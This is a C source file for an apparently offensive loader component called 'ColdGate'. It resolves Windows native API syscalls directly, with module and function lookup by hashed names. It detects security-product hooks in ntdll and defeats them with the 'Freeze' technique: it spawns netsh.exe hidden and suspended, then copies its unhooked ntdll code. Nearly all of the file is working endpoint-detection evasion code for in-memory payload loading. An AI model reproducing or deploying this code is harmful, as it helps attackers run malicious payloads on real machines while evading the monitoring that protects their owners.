//#include "ReflectiveLoader.h"
#include "ColdGate.h"

//
// Main stub that is called by all the native API functions
//
#pragma optimize( "g", off )
#pragma warning(disable: 4100) // warning C4100: unreferenced formal parameter
NTSTATUS SyscallStub(Syscall* pSyscall, ...) {
	return DoSyscall();
}
#pragma warning(default: 4100)
#pragma optimize( "g", on )


//
// Native API functions
//
NTSTATUS msfNtAllocateVirtualMemory(Syscall* pSyscall, HANDLE hProcess, PVOID* pBaseAddress, ULONG_PTR pZeroBits, PSIZE_T pRegionSize, ULONG ulAllocationType, ULONG ulProtect) {
	return SyscallStub(pSyscall, hProcess, pBaseAddress, pZeroBits, pRegionSize, ulAllocationType, ulProtect);
}

NTSTATUS msfNtProtectVirtualMemory(Syscall* pSyscall, HANDLE hProcess, PVOID* pBaseAddress, PSIZE_T pNumberOfBytesToProtect, ULONG ulNewAccessProtection, PULONG ulOldAccessProtection) {
	return SyscallStub(pSyscall, hProcess, pBaseAddress, pNumberOfBytesToProtect, ulNewAccessProtection, ulOldAccessProtection);
}

NTSTATUS msfNtFlushInstructionCache(Syscall* pSyscall, HANDLE hProcess, PVOID* pBaseAddress, SIZE_T FlushSize) {
	return SyscallStub(pSyscall, hProcess, pBaseAddress, FlushSize);
}

NTSTATUS msfNtLockVirtualMemory(Syscall* pSyscall, HANDLE hProcess, PVOID* pBaseAddress, PSIZE_T NumberOfBytesToLock, ULONG MapType) {
	return SyscallStub(pSyscall, hProcess, pBaseAddress, NumberOfBytesToLock, MapType);
}

NTSTATUS msfNtReadVirtualMemory(Syscall* pSyscall, HANDLE hProcess, PVOID pBaseAddress, PVOID pBuffer, SIZE_T NumberOfBytesToRead, PSIZE_T pNumberOfBytesRead) {
	return SyscallStub(pSyscall, hProcess, pBaseAddress, pBuffer, NumberOfBytesToRead, pNumberOfBytesRead);
}

NTSTATUS msfNtClose(Syscall* pSyscall, HANDLE hProcess) {
	return SyscallStub(pSyscall, hProcess);
}

NTSTATUS msfNtTerminateProcess(Syscall* pSyscall, HANDLE hProcess, NTSTATUS ntExitStatus) {
	return SyscallStub(pSyscall, hProcess, ntExitStatus);
}

NTSTATUS msfNtFreeVirtualMemory(Syscall* pSyscall, HANDLE hProcess, PVOID* pBaseAddress, PSIZE_T pRegionSize, ULONG uFreeType) {
	return SyscallStub(pSyscall, hProcess, pBaseAddress, pRegionSize, uFreeType);
}

//
// Wrapper functions used to force a call to the system function even if it is hooked. These are used during the unhooking process.
// If the correcponding syscall is hooked, the hooked function will be called directly. We cannot do anything about it.
// Otherwise, it calls the direct syscall function.
//
NTSTATUS NtAllocateVirtualMemoryWrapper(Syscall* pSyscall, HANDLE hProcess, PVOID* pBaseAddress, ULONG_PTR pZeroBits, PSIZE_T pRegionSize, ULONG ulAllocationType, ULONG ulProtect) {
	if (pSyscall->hooked)
		return ((NTALLOCATEVIRTUALMEMORY)pSyscall->pColdGate)(hProcess, pBaseAddress, pZeroBits, pRegionSize, ulAllocationType, ulProtect);
	else
		return msfNtAllocateVirtualMemory(pSyscall, hProcess, pBaseAddress, pZeroBits, pRegionSize, ulAllocationType, ulProtect);
}

NTSTATUS NtReadVirtualMemoryWrapper(Syscall* pSyscall, HANDLE hProcess, PVOID pBaseAddress, PVOID pBuffer, SIZE_T NumberOfBytesToRead, PSIZE_T pNumberOfBytesRead) {
	if (pSyscall->hooked)
		return ((NTREADVIRTUALMEMORY)pSyscall->pColdGate)(hProcess, pBaseAddress, pBuffer, NumberOfBytesToRead, pNumberOfBytesRead);
	else
		return msfNtReadVirtualMemory(pSyscall, hProcess, pBaseAddress, pBuffer, NumberOfBytesToRead, pNumberOfBytesRead);
}

NTSTATUS NtCloseWrapper(Syscall* pSyscall, HANDLE hProcess) {
	if (pSyscall->hooked)
		return ((NTCLOSE)pSyscall->pColdGate)(hProcess);
	else
		return msfNtClose(pSyscall, hProcess);
}

NTSTATUS NtTerminateProcessWrapper(Syscall* pSyscall, HANDLE hProcess, NTSTATUS ntExitStatus) {
	if (pSyscall->hooked)
		return ((NTTERMINATEPROCESS)pSyscall->pColdGate)(hProcess, ntExitStatus);
	else
		return msfNtTerminateProcess(pSyscall, hProcess, ntExitStatus);
}

NTSTATUS NtFreeVirtualMemoryWrapper(Syscall* pSyscall, HANDLE hProcess, PVOID* pBaseAddress, PSIZE_T pRegionSize, ULONG uFreeType) {
	if (pSyscall->hooked)
		return ((NTFREEVIRTUALMEMORY)pSyscall->pColdGate)(hProcess, pBaseAddress, pRegionSize, uFreeType);
	else
		return msfNtFreeVirtualMemory(pSyscall, hProcess, pBaseAddress, pRegionSize, uFreeType);
}


//
// Extract the syscall number and the address of the instruction sequence "syscall/retn"
//
BOOL ExtractSysCallData(PVOID pStub, Syscall *pSyscall) {
	INT8 cIdxStub = 0, cOffsetStub = 0;
	PBYTE pbCurrentByte = NULL;
	DWORD dSyscallNb = 0;

	if (pStub == NULL || pSyscall == NULL)
		return FALSE;

	for (cIdxStub = 0; cIdxStub < SYS_STUB_SIZE; cIdxStub++) {
		pbCurrentByte = (PBYTE)pStub + cIdxStub;


		//if (*pbCurrentByte == 0xe9 || ((pSyscall->dwCryptedHash == NTFLUSHINSTRUCTIONCACHE_HASH || pSyscall->dwCryptedHash == NTTERMINATEPROCESS_HASH) && !pSyscall->hooked)) { // Simulate hooking for testing
		if (*pbCurrentByte == 0xe9) {
			// This syscall stub is hooked
			// Temporarly store the hooked syscall stub in pColdGate to be used later.
			pSyscall->pColdGate = pStub;
			pSyscall->hooked = TRUE;

			return TRUE;
		}

		if (*pbCurrentByte == 0xc3) // Too far
			return FALSE;

#ifdef _WIN64
		// On x64 Windows, the function starts like this:
		// 4C 8B D1          mov r10, rcx
		// B8 96 00 00 00    mov eax, 96h   ; syscall number
		if (*(PUINT32)pbCurrentByte == 0xb8d18b4c) {

			// Then on Windows 10/11 (x64):
			// F6 04 25 08 03 FE 7F 01    test    byte ptr ds:7FFE0308h, 1
			// 75 03                      jnz     short loc_1800A4E65
			// 0F 05                      syscall
			// C3                         retn
			if (*(PUINT64)(pbCurrentByte + 8) == 0x017ffe03082504f6 && *(PUINT32)(pbCurrentByte + 16) == 0x050f0375 && *(pbCurrentByte + 20) == 0xc3) {
				dSyscallNb = *(PDWORD)((PBYTE)pStub + 4 + cIdxStub);
				cOffsetStub = cIdxStub + 18;
				break;
			}

			// On Windows 7 SP1 (x64) and Windows Server 2012 (x64):
			// 0F 05                        syscall
			// C3                           retn
			if (*(PUINT16)(pbCurrentByte + 8) == 0x050f && *(pbCurrentByte + 10) == 0xc3) {
				dSyscallNb = *(PDWORD)((PBYTE)pStub + 4 + cIdxStub);
				cOffsetStub = cIdxStub + 8;
				break;
			}
		}
#else
		// On x86 ntdll, it starts like this:
		// B8 F1 00 00 00               mov     eax, 0F1h      ; syscall number
		if (*pbCurrentByte == 0xb8) {
			if (

				// Then, on Windows 10/11 WoW64 (x64):
				// BA 00 8F 31 4B               mov     edx, offset _Wow64SystemServiceCall@0 ; we cannot match on the offset since it changes
				// FF D2                        call    edx            ; Wow64SystemServiceCall()
				// C2 10 00                     retn    10h
				*(pbCurrentByte + 5) == 0xba && *(PUINT16)(pbCurrentByte + 10) == 0xd2ff && *(pbCurrentByte + 12) == 0xc2 ||

				// Windows 7 SP1 (x86)
				*(pbCurrentByte + 5) == 0xba && *(PUINT16)(pbCurrentByte + 10) == 0x12ff && *(pbCurrentByte + 12) == 0xc2 ||

				// On Windows 7 SP1 WoW64 (x64), it has two variants. So, let's ignore the first instruction and match the remaining bytes.
				// Variant #1:
				// 33 C9                        xor     ecx, ecx
				// 8D 54 24 04                  lea     edx, [esp+arg_0]
				// 64 FF 15 C0 00 00 00         call    large dword ptr fs:0C0h
				// 83 C4 04                     add     esp, 4
				// C2 0C 00                     retn    0Ch
				*(PUINT64)(pbCurrentByte + 7) == 0xc015ff640424548d && *(PUINT32)(pbCurrentByte + 15) == 0x83000000 && *(PUINT16)(pbCurrentByte + 19) == 0x04c4  && *(pbCurrentByte + 21) == 0xc2 ||

				// Variant #2:
				// B9 0C 00 00 00               mov     ecx, 0Ch
				// 8D 54 24 04                  lea     edx, [esp+arg_0]
				// 64 FF 15 C0 00 00 00         call    large dword ptr fs:0C0h
				// 83 C4 04                     add     esp, 4
				// C2 0C 00                     retn    0Ch
				*(PUINT64)(pbCurrentByte + 10) == 0xc015ff640424548d && *(PUINT32)(pbCurrentByte + 18) == 0x83000000 && *(PUINT16)(pbCurrentByte + 22) == 0x04c4 && *(pbCurrentByte + 24) == 0xc2 ||

				// On Windows Server 2012 WoW64 (x64)
				// 64 FF 15 C0 00 00 00         call    large dword ptr fs:0C0h
				// C2 0C 00                     retn    0Ch
				* (PUINT64)(pbCurrentByte + 5) == 0xc2000000c015ff64
				) {
				dSyscallNb = *(PDWORD)((PBYTE)pStub + 1 + cIdxStub);
				cOffsetStub = cIdxStub + 5;
				break;
			}
		}
#endif

	}

	if (cOffsetStub > 0) {
		pSyscall->dwSyscallNr = dSyscallNb;
		pSyscall->pColdGate = (LPVOID)((PBYTE)pStub + cOffsetStub);
		pSyscall->hooked = FALSE;

		return TRUE;
	}

	return FALSE;
}

//
// Go through the PE header to get the " .text" section RVA and size
//
BOOL findTextSection(PVOID pNtdllBase, DWORD * pSectionRVA, SIZE_T * cbSectionSize) {
	PIMAGE_DOS_HEADER pDosHdr = NULL;
	PIMAGE_NT_HEADERS pNtHdrs = NULL;
	PIMAGE_SECTION_HEADER sectionHeader;

	pDosHdr = (PIMAGE_DOS_HEADER)pNtdllBase;
	pNtHdrs = (PIMAGE_NT_HEADERS)((PBYTE)pNtdllBase + pDosHdr->e_lfanew);
	sectionHeader = IMAGE_FIRST_SECTION(pNtHdrs);
	UINT nbSection = pNtHdrs->FileHeader.NumberOfSections;
	for (UINT i = 0; i < nbSection; ++i, ++sectionHeader) {
		// Looking for ".text" (0x2e, 0x74, 0x65, 0x78, 0x74)
		if (*(PINT32)sectionHeader->Name == 0x7865742e && *(PBYTE)((PBYTE)sectionHeader->Name + 4) == 0x74) {
			*pSectionRVA = sectionHeader->VirtualAddress;
			*cbSectionSize = sectionHeader->Misc.VirtualSize;
			return TRUE;
			break;
		}
	}

	return FALSE;
}

//
// Compute the module name hash
//
ULONG_PTR computeModuleHash(PWSTR pBuffer, USHORT usLength) {
	ULONG_PTR ulHash = 0;
	ULONG_PTR ulPtr = (ULONG_PTR)pBuffer;
	USHORT usIndex = usLength;

	do
	{
		ulHash = ror((DWORD)ulHash);
		// normalize to uppercase if the module name is in lowercase
		if (*((BYTE*)ulPtr) >= 'a')
			ulHash += *((BYTE*)ulPtr) - 0x20;
		else
			ulHash += *((BYTE*)ulPtr);
		ulPtr++;
	} while (--usIndex);

	return ulHash;
}

//
// Find ntdll and kernel32 module addresses
//
BOOL findModules(PVOID *pNtdllBase, PVOID *pKernel32) {
	_PPEB pPeb = NULL;
	PPEB_LDR_DATA pLdrData = NULL;
	PLDR_DATA_TABLE_ENTRY pModuleEntry = NULL, pModuleStart = NULL;
	PUNICODE_STR pDllName = NULL;
	ULONG_PTR ulModuleHash = 0;

#ifdef _WIN64
	pPeb = (_PPEB)__readgsqword(0x60);
#else
	pPeb = (_PPEB)__readfsdword(0x30);
#endif

	pLdrData = pPeb->pLdr;
	pModuleEntry = pModuleStart = (PLDR_DATA_TABLE_ENTRY)pLdrData->InMemoryOrderModuleList.Flink;

	*pNtdllBase = NULL;
	do {

		pDllName = &pModuleEntry->BaseDllName;

		if (pDllName->pBuffer == NULL)
			return FALSE;

		ulModuleHash = computeModuleHash(pDllName->pBuffer, pDllName->Length);

		switch ((DWORD)ulModuleHash) {
		case NTDLLDLL_HASH:
			*pNtdllBase = (PVOID)pModuleEntry->DllBase;
			break;
		case KERNEL32DLL_HASH:
			*pKernel32 = (PVOID)pModuleEntry->DllBase;
		}

		if (*pNtdllBase && *pKernel32)
			return TRUE;

		pModuleEntry = (PLDR_DATA_TABLE_ENTRY)pModuleEntry->InMemoryOrderModuleList.Flink;

	} while (pModuleEntry != pModuleStart);

	return FALSE;
}

//
// Retrieve the "system32" path on this system, which can be located on a different drive letter than C:, and concatenate the executable name.
//
BOOL getExePath(UtilityFunctions* pUtilityFunctions, PCHAR szPath, PCHAR szExe, UINT usPathSize) {
	PCHAR pSrc = NULL;
	PCHAR pDst = NULL;
	UINT uSize = 0;

	if (pUtilityFunctions == NULL || pUtilityFunctions->pGetSystemDirectoryA == NULL || szPath == NULL || szExe == NULL || usPathSize == 0)
		return FALSE;

	// The first call to GetSystemDirectoryA() will return the size needed to store the path, including the NULL terminator.
	uSize = pUtilityFunctions->pGetSystemDirectoryA(szPath, 0);
	if (uSize == 0 || uSize > usPathSize)
		return FALSE;
	// The second call will get the system path. Note that it returns the number of characters without the NULL terminator.
	uSize = pUtilityFunctions->pGetSystemDirectoryA(szPath, usPathSize);
	if (uSize == 0)
		return FALSE;
	usPathSize -= uSize;
	pDst = szPath + uSize;
	*pDst++ = '\\';
	if (--usPathSize == 0)
		return FALSE;

	pSrc = szExe;
	while ((*pDst = *pSrc) != '\0') {
		if (--usPathSize == 0)
			return FALSE;
		pSrc++;
		pDst++;
	}

	return TRUE;
}

//
// Retrieve the syscall data for every functions in Syscalls and UilitySyscalls arrays of Syscall structures.
// It goes through ntdll exports and compare the hash of the function names with the hash contained in the structures.
// For each matching hash, it extract the syscall data and store it in the structure.
//
BOOL getSyscallsFromNtdll(PVOID pNtdllBase, Syscall Syscalls[], DWORD dwSyscallSize, Syscall UilitySyscalls[], DWORD dwUilitySyscallSize) {
	PIMAGE_DOS_HEADER pDosHdr = NULL;
	PIMAGE_NT_HEADERS pNtHdrs = NULL;
	PIMAGE_EXPORT_DIRECTORY pExportDir = NULL;
	PDWORD pdwAddrOfNames = NULL, pdwAddrOfFunctions = NULL;
	PWORD pwAddrOfNameOrdinales = NULL;
	DWORD dwHashFunctionName = 0, dwIdxfName = 0, dwIdxSyscall = 0;
	PVOID pStub = NULL;

	pDosHdr = (PIMAGE_DOS_HEADER)pNtdllBase;
	pNtHdrs = (PIMAGE_NT_HEADERS)((PBYTE)pNtdllBase + pDosHdr->e_lfanew);
	pExportDir = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pNtdllBase + pNtHdrs->OptionalHeader.DataDirectory[0].VirtualAddress);

	pdwAddrOfFunctions = (PDWORD)((PBYTE)pNtdllBase + pExportDir->AddressOfFunctions);
	pdwAddrOfNames = (PDWORD)((PBYTE)pNtdllBase + pExportDir->AddressOfNames);
	pwAddrOfNameOrdinales = (PWORD)((PBYTE)pNtdllBase + pExportDir->AddressOfNameOrdinals);

	// Total number of functions needed to process
	DWORD dwCounter = dwSyscallSize + dwUilitySyscallSize;

	for (dwIdxfName = 0; dwIdxfName < pExportDir->NumberOfNames; dwIdxfName++) {
		dwHashFunctionName = _hash((PCHAR)((PBYTE)pNtdllBase + pdwAddrOfNames[dwIdxfName]));
		pStub = (PVOID)((PBYTE)pNtdllBase + pdwAddrOfFunctions[pwAddrOfNameOrdinales[dwIdxfName]]);

		// First, process the provided function names
		for (dwIdxSyscall = 0; dwIdxSyscall < dwSyscallSize; ++dwIdxSyscall) {
			if (dwHashFunctionName == Syscalls[dwIdxSyscall].dwCryptedHash) {
				if (!ExtractSysCallData(pStub, &Syscalls[dwIdxSyscall]))
					return FALSE;

				if (Syscalls[dwIdxSyscall].hooked) {
					// Temporarly store the index to the function name in dwSyscallNr.
					// This will be processed when calling UnhookSyscalls().
					Syscalls[dwIdxSyscall].dwSyscallNr = dwIdxfName;
				}

				--dwCounter;
				break;
			}
		}

		// Then, check if this is a function needed by the loader.
		// If so, check if this function has already been processed in the previous step and just copy the data to reuse it.
		// If we don't have it, call ExtractSysCallData() to extract the data from ntdll.
		switch (dwHashFunctionName) {
		case NTALLOCATEVIRTUALMEMORY_HASH:
			if (dwIdxSyscall < dwSyscallSize && Syscalls[dwIdxSyscall].dwCryptedHash == NTALLOCATEVIRTUALMEMORY_HASH) {
				UilitySyscalls[NTALLOCATEVIRTUALMEMORY_SYSCALL] = Syscalls[dwIdxSyscall];
			}
			else {
				if (!ExtractSysCallData(pStub, &UilitySyscalls[NTALLOCATEVIRTUALMEMORY_SYSCALL]))
					return FALSE;
			}
			break;
		case NTREADVIRTUALMEMORY_HASH:
			if (dwIdxSyscall < dwSyscallSize && Syscalls[dwIdxSyscall].dwCryptedHash == NTREADVIRTUALMEMORY_HASH) {
				UilitySyscalls[NTREADVIRTUALMEMORY_SYSCALL] = Syscalls[dwIdxSyscall];
			}
			else {
				if (!ExtractSysCallData(pStub, &UilitySyscalls[NTREADVIRTUALMEMORY_SYSCALL]))
					return FALSE;
			}
			--dwCounter;
			break;
		case NTCLOSE_HASH:
			if (dwIdxSyscall < dwSyscallSize && Syscalls[dwIdxSyscall].dwCryptedHash == NTCLOSE_HASH) {
				UilitySyscalls[NTCLOSE_SYSCALL] = Syscalls[dwIdxSyscall];
			}
			else {
				if (!ExtractSysCallData(pStub, &UilitySyscalls[NTCLOSE_SYSCALL]))
					return FALSE;
			}
			--dwCounter;
			break;
		case NTTERMINATEPROCESS_HASH:
			if (dwIdxSyscall < dwSyscallSize && Syscalls[dwIdxSyscall].dwCryptedHash == NTTERMINATEPROCESS_HASH) {
				UilitySyscalls[NTTERMINATEPROCESS_SYSCALL] = Syscalls[dwIdxSyscall];
			}
			else {
				if (!ExtractSysCallData(pStub, &UilitySyscalls[NTTERMINATEPROCESS_SYSCALL]))
					return FALSE;
			}
			--dwCounter;
			break;
		case NTFREEVIRTUALMEMORY_HASH:
			if (dwIdxSyscall < dwSyscallSize && Syscalls[dwIdxSyscall].dwCryptedHash == NTFREEVIRTUALMEMORY_HASH) {
				UilitySyscalls[NTFREEVIRTUALMEMORY_SYSCALL] = Syscalls[dwIdxSyscall];
			}
			else {
				if (!ExtractSysCallData(pStub, &UilitySyscalls[NTFREEVIRTUALMEMORY_SYSCALL]))
					return FALSE;
			}
			--dwCounter;
		}

		if (dwCounter == 0)
			break;
	}

	// Last check to make sure we have everything we need
	for (dwIdxSyscall = 0; dwIdxSyscall < dwSyscallSize; ++dwIdxSyscall) {
		if (Syscalls[dwIdxSyscall].pColdGate == NULL)
			return FALSE;
	}
	for (dwIdxSyscall = 0; dwIdxSyscall < dwUilitySyscallSize; ++dwIdxSyscall) {
		if (UilitySyscalls[dwIdxSyscall].pColdGate == NULL)
			return FALSE;
	}

	return TRUE;
}

//
// Get the syscall numbers using the Freeze technnique
//
BOOL UnhookSyscalls(PVOID pNtdllBase, UtilityFunctions* pUtilityFunctions, Syscall Syscalls[], DWORD dwSyscallSize, Syscall UtilitySyscalls[], DWORD dwUilitySyscallSize) {
	BOOL bSuccess = FALSE;
	CHAR szProc[EXE_PATH_SIZE] = { 0 };
	CHAR szExe[] = { 'n', 'e', 't', 's', 'h', '.', 'e', 'x', 'e', '\0' };
	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	DWORD dwTextSectionVA = 0, dwIdxSyscall = 0;
	SIZE_T cbSectionSize = 0, RegionSize = 0;
	LPVOID pLocalSection = NULL;
	PIMAGE_DOS_HEADER pDosHdr = NULL;
	PIMAGE_NT_HEADERS pNtHdrs = NULL;
	PIMAGE_EXPORT_DIRECTORY pExportDir = NULL;
	PDWORD pdwAddrOfFunctions = NULL;
	PWORD pwAddrOfNameOrdinales = NULL;
	PVOID pStub = NULL, pOriginalStub = NULL;
	UINT_PTR upOffset = 0;

	// First, make sure we have the function needed to bypass hooking
	for (dwIdxSyscall = 0; dwIdxSyscall < dwUilitySyscallSize; ++dwIdxSyscall) {
		if (UtilitySyscalls[dwIdxSyscall].pColdGate == NULL)
			goto exit;
	}

	if (pNtdllBase == NULL)
		goto exit;

	// Get the executable full path , assuming it is located in System32 directory.
	// This will ensure the correct path is used even if Windows is not installed on C drive.
	bSuccess = getExePath(pUtilityFunctions, szProc, szExe, EXE_PATH_SIZE);
	if (!bSuccess)
		goto exit;

	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;

	// Use the Freeze technique to retrive unhooked syscalls
	// First, create  the process in a suspended state
	bSuccess = pUtilityFunctions->pCreateProcessA(szProc, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
	if (!bSuccess)
		goto exit;

	// Look for the ".text" section in the loaded ntdll.dll module.
	// This address will be the same in the created process address space.
	bSuccess = findTextSection(pNtdllBase, &dwTextSectionVA, &cbSectionSize);
	if (!bSuccess)
		goto exit;

	// Now, we just need to allocate some memory space locally and copy the ntdll.dll section form the created process.
	RegionSize = cbSectionSize;
	if (NtAllocateVirtualMemoryWrapper(&UtilitySyscalls[NTALLOCATEVIRTUALMEMORY_SYSCALL], (HANDLE)-1, &pLocalSection, (ULONG_PTR)0, &RegionSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE) != 0) {
		__debugbreak();
		goto exit;
	}

	if (NtReadVirtualMemoryWrapper(&UtilitySyscalls[NTREADVIRTUALMEMORY_SYSCALL], pi.hProcess, (PVOID)((PBYTE)pNtdllBase + dwTextSectionVA), pLocalSection, cbSectionSize, NULL) != 0) {
		__debugbreak();
		goto exit;
	}

	// Finally, we just go through the same process of getting syscall data, but this time from the copy of the unhooked ntdll.dll that comes from the created process.
	pDosHdr = (PIMAGE_DOS_HEADER)pNtdllBase;
	pNtHdrs = (PIMAGE_NT_HEADERS)((PBYTE)pNtdllBase + pDosHdr->e_lfanew);
	pExportDir = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pNtdllBase + pNtHdrs->OptionalHeader.DataDirectory[0].VirtualAddress);

	pdwAddrOfFunctions = (PDWORD)((PBYTE)pNtdllBase + pExportDir->AddressOfFunctions);
	pwAddrOfNameOrdinales = (PWORD)((PBYTE)pNtdllBase + pExportDir->AddressOfNameOrdinals);

	for (dwIdxSyscall = 0; dwIdxSyscall < dwSyscallSize; ++dwIdxSyscall) {
		if (Syscalls[dwIdxSyscall].hooked) {
			// pColdGate contains the native API function address in the loaded ntdll
			pOriginalStub = Syscalls[dwIdxSyscall].pColdGate;

			// dwSyscallNr contains the index to the function name we got the first time we tried to get the syscall data.
			pStub = (PVOID)((PBYTE)pLocalSection - dwTextSectionVA + pdwAddrOfFunctions[pwAddrOfNameOrdinales[Syscalls[dwIdxSyscall].dwSyscallNr]]);
			if (pStub == NULL)
				goto exit;

			bSuccess = ExtractSysCallData(pStub, &Syscalls[dwIdxSyscall]);
			// If it is still hooked, the Freeze technique failed and we cannot do anything else.
			if (!bSuccess || Syscalls[dwIdxSyscall].hooked)
				goto exit;

			// Now, the trampolin address (pColdGate) points to an address loacted in the local copy of ntdll.
			// We need to set it to a trampolin address in the loaded ntdll.
			// First, get the offset of the trampolin address.
			upOffset = ((PBYTE)Syscalls[dwIdxSyscall].pColdGate - (PBYTE)pStub);
			// Then, add the offset to get the address in the loaded ntdll
			Syscalls[dwIdxSyscall].pColdGate = (LPVOID)((PBYTE)pOriginalStub + upOffset);
		}
	}

	bSuccess = TRUE;

exit:
	if (pi.hProcess) {
		if (NtTerminateProcessWrapper(&UtilitySyscalls[NTTERMINATEPROCESS_SYSCALL], pi.hProcess, (NTSTATUS)0) != 0) {
			__debugbreak();
		}
		if (NtCloseWrapper(&UtilitySyscalls[NTCLOSE_SYSCALL], pi.hProcess) != 0) {
			__debugbreak();
		}
	}

	if (pi.hThread) {
		if (NtCloseWrapper(&UtilitySyscalls[NTCLOSE_SYSCALL], pi.hThread) != 0) {
			__debugbreak();
		}
	}

	if (pLocalSection) {
		RegionSize = 0;
		if (NtFreeVirtualMemoryWrapper(&UtilitySyscalls[NTFREEVIRTUALMEMORY_SYSCALL], (HANDLE)-1, &pLocalSection, &RegionSize, MEM_RELEASE) != 0) {
			__debugbreak();
		}
		pLocalSection = NULL;
	}

	return bSuccess;
}

//
// Go through kernel32 exports and setup the highlevel functions needed for the whole process
// TODO: add a custom implementation of these functions to avoid a call through kernel32 and reduce the footprint
//
BOOL getKernel32Functions(PVOID pKernel32, UtilityFunctions* pUtilityFunctions) {
	PIMAGE_DOS_HEADER pDosHdr = NULL;
	PIMAGE_NT_HEADERS pNtHdrs = NULL;
	PIMAGE_EXPORT_DIRECTORY pExportDir = NULL;
	PDWORD pdwAddrOfNames = NULL, pdwAddrOfFunctions = NULL;
	PWORD pwAddrOfNameOrdinales = NULL;
	DWORD dwIdxfName = 0, dwCounter = 0;

	pDosHdr = (PIMAGE_DOS_HEADER)pKernel32;
	pNtHdrs = (PIMAGE_NT_HEADERS)((PBYTE)pKernel32 + pDosHdr->e_lfanew);
	pExportDir = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pKernel32 + pNtHdrs->OptionalHeader.DataDirectory[0].VirtualAddress);

	pdwAddrOfFunctions = (PDWORD)((PBYTE)pKernel32 + pExportDir->AddressOfFunctions);
	pdwAddrOfNames = (PDWORD)((PBYTE)pKernel32 + pExportDir->AddressOfNames);
	pwAddrOfNameOrdinales = (PWORD)((PBYTE)pKernel32 + pExportDir->AddressOfNameOrdinals);

	// Total number of functions needed to process
	dwCounter = UTILITY_FUNC_NB;

	for (dwIdxfName = 0; dwIdxfName < pExportDir->NumberOfNames; dwIdxfName++) {

		switch (_hash((PCHAR)((PBYTE)pKernel32 + pdwAddrOfNames[dwIdxfName]))) {
		case LOADLIBRARYA_HASH:
			pUtilityFunctions->pLoadLibraryA = (LOADLIBRARYA)((PBYTE)pKernel32 + pdwAddrOfFunctions[pwAddrOfNameOrdinales[dwIdxfName]]);
			--dwCounter;
			break;
		case GETPROCADDRESS_HASH:
			pUtilityFunctions->pGetProcAddress = (GETPROCADDRESS)((PBYTE)pKernel32 + pdwAddrOfFunctions[pwAddrOfNameOrdinales[dwIdxfName]]);
			--dwCounter;
			break;
		case CREATEPROCESSA_HASH:
			pUtilityFunctions->pCreateProcessA = (CREATEPROCESSA)((PBYTE)pKernel32 + pdwAddrOfFunctions[pwAddrOfNameOrdinales[dwIdxfName]]);
			--dwCounter; 
			break;
		case GETSYSTEMDIRECTORYA_HASH:
			pUtilityFunctions->pGetSystemDirectoryA = (GETSYSTEMDIRECTORYA)((PBYTE)pKernel32 + pdwAddrOfFunctions[pwAddrOfNameOrdinales[dwIdxfName]]);
			--dwCounter;
		}

		if (dwCounter == 0)
			break;
	}

	// Last check to make sure we have everything we need
	if (pUtilityFunctions->pLoadLibraryA && pUtilityFunctions->pGetProcAddress && pUtilityFunctions->pCreateProcessA && pUtilityFunctions->pGetSystemDirectoryA)
		return TRUE;

	return FALSE;
}

//
// Main function the populate the array of Syscall structures before calling each ColdGate Native API function
//
BOOL getSyscalls(PVOID pNtdllBase, Syscall Syscalls[], DWORD dwSyscallSize, UtilityFunctions* pUtilityFunctions) {
	BOOL hasHooked = FALSE;

	Syscall ColdGateSyscalls[] = {
		{.dwCryptedHash = NTALLOCATEVIRTUALMEMORY_HASH, .dwNumberOfArgs = 6, .hooked = FALSE},
		{.dwCryptedHash = NTREADVIRTUALMEMORY_HASH, .dwNumberOfArgs = 5, .hooked = FALSE},
		{.dwCryptedHash = NTCLOSE_HASH, .dwNumberOfArgs = 1, .hooked = FALSE},
		{.dwCryptedHash = NTTERMINATEPROCESS_HASH, .dwNumberOfArgs = 2, .hooked = FALSE},
		{.dwCryptedHash = NTFREEVIRTUALMEMORY_HASH, .dwNumberOfArgs = 4, .hooked = FALSE}
	};
	DWORD dwColdGateSyscallSize  = sizeof(ColdGateSyscalls) / sizeof(ColdGateSyscalls[0]);

	if (!getSyscallsFromNtdll(pNtdllBase, Syscalls, dwSyscallSize, ColdGateSyscalls, dwColdGateSyscallSize))
		return FALSE;

	// Check if we have hooked functions
	for (DWORD i = 0; i < dwSyscallSize; ++i) {
		if (Syscalls[i].hooked) {
			hasHooked = TRUE;
			break;
		}
	}

	// Process hooked functions if any
	if (hasHooked) {
		if (!UnhookSyscalls(pNtdllBase, pUtilityFunctions, Syscalls, dwSyscallSize, ColdGateSyscalls, dwColdGateSyscallSize))
			return FALSE;
	}

	return TRUE;
}
